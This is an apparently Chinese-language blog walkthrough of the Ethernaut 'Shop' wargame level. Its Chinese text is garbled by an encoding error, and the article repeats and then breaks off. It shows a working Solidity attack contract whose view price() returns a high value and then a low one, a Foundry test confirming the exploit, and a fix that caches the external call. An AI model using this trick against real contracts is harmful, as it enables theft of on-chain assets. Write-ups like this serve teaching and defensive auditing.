href=\"https://ethernaut.openzeppelin.com/level/21\">Ethernaut Level 21 - Shop</a><br><strong>æ”»å‡»ç±»å‹</strong>: å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ– &#x2F; ä¼ª <code>view</code> å‡½æ•°<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ éœ€è¦ä» <code>Shop</code> åˆçº¦ä¸­ä¹°ä¸‹å•†å“ã€‚ä½†æœ‰ä¸€ä¸ªæ¡ä»¶ï¼šä½ å¿…é¡»ä»¥ä½äºåŸä»·ï¼ˆ100ï¼‰çš„ä»·æ ¼ä¹°ä¸‹å®ƒã€‚æœ€ç»ˆç›®æ ‡æ˜¯è®© <code>price</code> å˜é‡çš„å€¼å°äº100ï¼Œå¹¶ä¸” <code>isSold</code> ä¸º <code>true</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg\" alt=\"Shop Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ <code>Shop</code> åˆçº¦çš„ <code>buy()</code> å‡½æ•°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Shop &#123;</span><br><span class=\"line\">    uint public price = 100;</span><br><span class=\"line\">    bool public isSold;</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public &#123;</span><br><span class=\"line\">        Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">            isSold = true;</span><br><span class=\"line\">            price = _buyer.price();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// The interface the buyer must implement</span><br><span class=\"line\">interface Buyer &#123;</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ¼æ´åœ¨äº <code>buy()</code> å‡½æ•°å¯¹å¤–éƒ¨åˆçº¦ <code>_buyer</code> çš„ <code>price()</code> å‡½æ•°è¿›è¡Œäº†ä¸¤æ¬¡è°ƒç”¨ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong>: åœ¨ <code>if</code> æ¡ä»¶åˆ¤æ–­ä¸­ <code>_buyer.price() &gt;= price</code>ã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong>: åœ¨ <code>if</code> å—å†…éƒ¨ï¼Œç”¨äºæ›´æ–° <code>price</code> å˜é‡ <code>price = _buyer.price()</code>ã€‚</li>\n</ol>\n<p><code>Buyer</code> æ¥å£å°† <code>price()</code> å‡½æ•°æ ‡è®°ä¸º <code>view</code>ï¼Œè¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°ä¸åº”æ”¹å˜çŠ¶æ€ã€‚ç„¶è€Œï¼ŒEVM <strong>å¹¶ä¸å¼ºåˆ¶ <code>view</code> å‡½æ•°ä¸èƒ½ä¾èµ–äºçŠ¶æ€</strong>ã€‚ä¸€ä¸ªå¤–éƒ¨åˆçº¦çš„ <code>view</code> å‡½æ•°å®Œå…¨å¯ä»¥åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´è¿”å›ä¸åŒçš„å€¼ï¼Œåªè¦å®ƒçš„è¿”å›å€¼ä¾èµ–äºæŸäº›åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´å‘ç”Ÿå˜åŒ–çš„çŠ¶æ€ã€‚</p>\n<p>æˆ‘ä»¬çš„æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>åˆ›å»ºä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå®ç° <code>Buyer</code> æ¥å£ã€‚</li>\n<li>åœ¨æ”»å‡»åˆçº¦çš„ <code>price()</code> å‡½æ•°ä¸­åŠ å…¥é€»è¾‘ï¼šå¦‚æœ <code>Shop</code> åˆçº¦çš„ <code>isSold</code> çŠ¶æ€ä¸º <code>false</code>ï¼Œåˆ™è¿”å›ä¸€ä¸ªå¤§äºæˆ–ç­‰äº100çš„å€¼ï¼ˆä¾‹å¦‚101ï¼‰ï¼Œä»¥é€šè¿‡ <code>if</code> æ£€æŸ¥ã€‚å¦‚æœ <code>isSold</code> ä¸º <code>true</code>ï¼Œåˆ™è¿”å›ä¸€ä¸ªå°äº100çš„å€¼ï¼ˆä¾‹å¦‚1ï¼‰ã€‚</li>\n<li>å½“æˆ‘ä»¬è°ƒç”¨ <code>buy()</code> æ—¶ï¼š<ul>\n<li><code>if</code> æ¡ä»¶æ£€æŸ¥ï¼š<code>isSold</code> æ˜¯ <code>false</code>ï¼Œæˆ‘ä»¬çš„ <code>price()</code> è¿”å› <code>101</code>ã€‚<code>101 &gt;= 100</code> ä¸ºçœŸï¼Œæ£€æŸ¥é€šè¿‡ã€‚</li>\n<li>è¿›å…¥ <code>if</code> å—ï¼š<code>isSold</code> è¢«è®¾ç½®ä¸º <code>true</code>ã€‚</li>\n<li>æ›´æ–° <code>price</code>ï¼š<code>price = _buyer.price()</code> è¢«è°ƒç”¨ã€‚æ­¤æ—¶ <code>isSold</code> å·²ç»æ˜¯ <code>true</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ <code>price()</code> å‡½æ•°è¿”å› <code>1</code>ã€‚<code>Shop</code> åˆçº¦çš„ <code>price</code> å˜é‡è¢«æ›´æ–°ä¸º <code>1</code>ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä»¥ä½ä»·ä¹°ä¸‹äº†å•†å“ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦å®ç°äº† <code>Buyer</code> æ¥å£ï¼Œå…¶ <code>price()</code> å‡½æ•°æ ¹æ® <code>Shop</code> åˆçº¦çš„ <code>isSold</code> çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface IShop &#123;</span><br><span class=\"line\">    function isSold() external view returns (bool);</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">    function buy() external;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _shopAddress) &#123;</span><br><span class=\"line\">        shop = IShop(_shopAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¿™ä¸ª price å‡½æ•°æ˜¯æ”»å‡»çš„æ ¸å¿ƒ</span><br><span class=\"line\">    function price() public view returns (uint256) &#123;</span><br><span class=\"line\">        // å¦‚æœå•†å“è¿˜æ²¡å–å‡ºï¼Œè¿”å›é«˜ä»·ä»¥é€šè¿‡æ£€æŸ¥</span><br><span class=\"line\">        // å¦‚æœå·²ç»å–å‡ºï¼ˆåœ¨åŒä¸€æ¬¡ buy è°ƒç”¨ä¸­ï¼‰ï¼Œè¿”å›ä½ä»·æ¥æ›´æ–° price</span><br><span class=\"line\">        if (shop.isSold()) &#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return 101;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        shop.buy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/21_Shop.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Attack contract (as defined above)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\">    constructor(address _shop) &#123; shop = IShop(_shop); &#125;</span><br><span class=\"line\">    function price() public view returns (uint256) &#123; return shop.isSold() ? 1 : 101; &#125;</span><br><span class=\"line\">    function attack() public &#123; shop.buy(); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ShopTest is Test &#123;</span><br><span class=\"line\">    Shop instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Shop();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.price(), 1, &quot;Price should be updated to 1&quot;);</span><br><span class=\"line\">        assertTrue(instance.isSold(), &quot;isSold should be true&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»º <code>Attack</code> åˆçº¦ï¼Œå®ƒå®ç°äº† <code>Buyer</code> æ¥å£ã€‚</li>\n<li><strong>è°ƒç”¨ <code>attack()</code></strong>: <code>Attack</code> åˆçº¦çš„ <code>attack()</code> å‡½æ•°è°ƒç”¨ <code>Shop</code> åˆçº¦çš„ <code>buy()</code> å‡½æ•°ã€‚</li>\n<li><strong>åŒé‡è¿”å›å€¼</strong>: <code>Shop</code> åˆçº¦åœ¨åŒä¸€æ¬¡ <code>buy()</code> è°ƒç”¨ä¸­ä¸¤æ¬¡è°ƒç”¨ <code>Attack</code> åˆçº¦çš„ <code>price()</code> å‡½æ•°ï¼Œä½†ç”±äº <code>Shop</code> çš„å†…éƒ¨çŠ¶æ€ <code>isSold</code> å‘ç”Ÿäº†å˜åŒ–ï¼Œ<code>Attack</code> çš„ <code>price()</code> å‡½æ•°è¿”å›äº†ä¸¤ä¸ªä¸åŒçš„å€¼ï¼Œä»è€Œç»•è¿‡äº†é€»è¾‘æ£€æŸ¥å¹¶ä»¥ä½ä»·æˆäº¤ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>ä¸è¦åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­å¤šæ¬¡è°ƒç”¨å¤–éƒ¨ <code>view</code> å‡½æ•°</strong>: å¦‚æœå¿…é¡»è¿™æ ·åšï¼Œè¯·å°†ç¬¬ä¸€æ¬¡è°ƒç”¨çš„è¿”å›å€¼å­˜å‚¨åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨è¿™ä¸ªå±€éƒ¨å˜é‡ï¼Œè€Œä¸æ˜¯å†æ¬¡è¿›è¡Œå¤–éƒ¨è°ƒç”¨ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">function buy() public &#123;</span><br><span class=\"line\">    Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\">    uint _price = _buyer.price(); // åªè°ƒç”¨ä¸€æ¬¡ï¼Œå¹¶å°†ç»“æœå­˜å…¥å±€éƒ¨å˜é‡</span><br><span class=\"line\"></span><br><span class=\"line\">    if (_price &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">        isSold = true;</span><br><span class=\"line\">        price = _price; // ä½¿ç”¨å±€éƒ¨å˜é‡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼</strong>: å°½ç®¡æœ¬ä¾‹ä¸­çš„äº¤äº’æ˜¯ä¸€ä¸ª <code>view</code> å‡½æ•°ï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸å¤–éƒ¨åˆçº¦çš„äº¤äº’ã€‚æœ€ä½³å®è·µæ˜¯åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ï¼ˆâ€œç”Ÿæ•ˆâ€ï¼‰ä¹‹åå†è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæ›´å¥½çš„ä¿®å¤æ–¹æ³•æ˜¯ç¼“å­˜è¿”å›å€¼ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>view</code> å‡½æ•°çš„è¯¯è§£</strong>: <code>view</code> å…³é”®å­—åªå‘ç¼–è¯‘å™¨æ‰¿è¯ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹çŠ¶æ€ã€‚å®ƒå¹¶ä¸ä¿è¯å‡½æ•°çš„è¿”å›å€¼æ˜¯çº¯ç²¹çš„æˆ–åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­ä¿æŒä¸å˜ã€‚</li>\n<li><strong>è·¨åˆçº¦è°ƒç”¨çš„çŠ¶æ€ä¾èµ–</strong>: ä¸€ä¸ªåˆçº¦çš„å‡½æ•°å¯ä»¥ä¾èµ–äºå¦ä¸€ä¸ªåˆçº¦çš„çŠ¶æ€ï¼Œè¿™å¯èƒ½å¯¼è‡´åƒæœ¬ä¾‹ä¸­è¿™æ ·æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚</li>\n<li><strong>Foundry <code>prank</code></strong>: æ¨¡æ‹Ÿæ¥è‡ªç‰¹å®šåœ°å€ï¼ˆ<code>player</code> -&gt; <code>attacker</code>ï¼‰çš„è°ƒç”¨é“¾ï¼Œæ˜¯æµ‹è¯•æ­¤ç±»äº¤äº’å¼æ”»å‡»çš„ç†æƒ³å·¥å…·ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>å¤–éƒ¨ <code>view</code> å‡½æ•°çš„è¿”å›å€¼ä¸æ˜¯æ’å®šçš„ï¼Œå®ƒå¯ä»¥åœ¨ä¸€æ¬¡äº¤æ˜“çš„ä¸åŒé˜¶æ®µå‘ç”Ÿå˜åŒ–ã€‚</li>\n<li>åœ¨ä¸€æ¬¡å‡½æ•°æ‰§è¡Œä¸­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªå¤–éƒ¨ <code>view</code> å‡½æ•°æ˜¯ä¸€ä¸ªå±é™©çš„æ¨¡å¼ï¼Œå› ä¸ºå®ƒçš„è¿”å›å€¼å¯èƒ½åœ¨ä½ æ„æƒ³ä¸åˆ°çš„æ—¶å€™å‘ç”Ÿæ”¹å˜ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>è®¾è®¡ä¸€ä¸ªæ¶æ„çš„ <code>view</code> å‡½æ•°ï¼Œä½¿å…¶æ ¹æ®ç›®æ ‡åˆçº¦çš„çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚</li>\n<li>åˆ©ç”¨ç›®æ ‡åˆçº¦åœ¨æ£€æŸ¥å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´çŠ¶æ€çš„å˜åŒ–ï¼Œæ¥æ“çºµ <code>view</code> å‡½æ•°çš„è¿”å›å€¼ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å½“éœ€è¦å¤šæ¬¡ä½¿ç”¨å¤–éƒ¨è°ƒç”¨çš„ç»“æœæ—¶ï¼Œåº”å°†å…¶ç¼“å­˜åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œä»¥ç¡®ä¿å…¶åœ¨æ•´ä¸ªå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€è‡´æ€§ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#view-functions\">Solidity Docs: View Functions</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-113\">SWC-113: DoS with Failed Call</a> (è™½ç„¶ä¸æ˜¯ç›´æ¥çš„DoSï¼Œä½†åŸç†ç›¸ä¼¼ï¼Œéƒ½æ¶‰åŠåˆ°å¯¹å¤–éƒ¨è°ƒç”¨ç»“æœçš„é”™è¯¯å¤„ç†)</li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-21-Shop-å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-21-Shop-å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\"></a>ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/21\">Ethernaut Level 21 - Shop</a><br><strong>æ”»å‡»ç±»å‹</strong>: å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ– &#x2F; ä¼ª <code>view</code> å‡½æ•°<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ éœ€è¦ä» <code>Shop</code> åˆçº¦ä¸­ä¹°ä¸‹å•†å“ã€‚ä½†æœ‰ä¸€ä¸ªæ¡ä»¶ï¼šä½ å¿…é¡»ä»¥ä½äºåŸä»·ï¼ˆ100ï¼‰çš„ä»·æ ¼ä¹°ä¸‹å®ƒã€‚æœ€ç»ˆç›®æ ‡æ˜¯è®© <code>price</code> å˜é‡çš„å€¼å°äº100ï¼Œå¹¶ä¸” <code>isSold</code> ä¸º <code>true</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg\" alt=\"Shop Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ <code>Shop</code> åˆçº¦çš„ <code>buy()</code> å‡½æ•°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Shop &#123;</span><br><span class=\"line\">    uint public price = 100;</span><br><span class=\"line\">    bool public isSold;</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public &#123;</span><br><span class=\"line\">        Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">            isSold = true;</span><br><span class=\"line\">            price = _buyer.price();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// The interface the buyer must implement</span><br><span class=\"line\">interface Buyer &#123;</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ¼æ´åœ¨äº <code>buy()</code> å‡½æ•°å¯¹å¤–éƒ¨åˆçº¦ <code>_buyer</code> çš„ <code>price()</code> å‡½æ•°è¿›è¡Œäº†ä¸¤æ¬¡è°ƒç”¨ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong>: åœ¨ <code>if</code> æ¡ä»¶åˆ¤æ–­ä¸­ <code>_buyer.price() &gt;= price</code>ã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong>: åœ¨ <code>if</code> å—å†…éƒ¨ï¼Œç”¨äºæ›´æ–° <code>price</code> å˜é‡ <code>price = _buyer.price()</code>ã€‚</li>\n</ol>\n<p><code>Buyer</code> æ¥å£å°† <code>price()</code> å‡½æ•°æ ‡è®°ä¸º <code>view</code>ï¼Œè¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°ä¸åº”æ”¹å˜çŠ¶æ€ã€‚ç„¶è€Œï¼ŒEVM <strong>å¹¶ä¸å¼ºåˆ¶ <code>view</code> å‡½æ•°ä¸èƒ½ä¾èµ–äºçŠ¶æ€</strong>ã€‚ä¸€ä¸ªå¤–éƒ¨åˆçº¦çš„ <code>view</code> å‡½æ•°å®Œå…¨å¯ä»¥åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´è¿”å›ä¸åŒçš„å€¼ï¼Œåªè¦å®ƒçš„è¿”å›å€¼ä¾èµ–äºæŸäº›åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´å‘ç”Ÿå˜åŒ–çš„çŠ¶æ€ã€‚</p>\n<p>æˆ‘ä»¬çš„æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>åˆ›å»ºä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå®ç° <code>Buyer</code> æ¥å£ã€‚</li>\n<li>åœ¨æ”»å‡»åˆçº¦çš„ <code>price()</code> å‡½æ•°ä¸­åŠ å…¥é€»è¾‘ï¼šå¦‚æœ <code>Shop</code> åˆçº¦çš„ <code>isSold</code> çŠ¶æ€ä¸º <code>false</code>ï¼Œåˆ™è¿”å›ä¸€ä¸ªå¤§äºæˆ–ç­‰äº100çš„å€¼ï¼ˆä¾‹å¦‚101ï¼‰ï¼Œä»¥é€šè¿‡ <code>if</code> æ£€æŸ¥ã€‚å¦‚æœ <code>isSold</code> ä¸º <code>true</code>ï¼Œåˆ™è¿”å›ä¸€ä¸ªå°äº100çš„å€¼ï¼ˆä¾‹å¦‚1ï¼‰ã€‚</li>\n<li>å½“æˆ‘ä»¬è°ƒç”¨ <code>buy()</code> æ—¶ï¼š<ul>\n<li><code>if</code> æ¡ä»¶æ£€æŸ¥ï¼š<code>isSold</code> æ˜¯ <code>false</code>ï¼Œæˆ‘ä»¬çš„ <code>price()</code> è¿”å› <code>101</code>ã€‚<code>101 &gt;= 100</code> ä¸ºçœŸï¼Œæ£€æŸ¥é€šè¿‡ã€‚</li>\n<li>è¿›å…¥ <code>if</code> å—ï¼š<code>isSold</code> è¢«è®¾ç½®ä¸º <code>true</code>ã€‚</li>\n<li>æ›´æ–° <code>price</code>ï¼š<code>price = _buyer.price()</code> 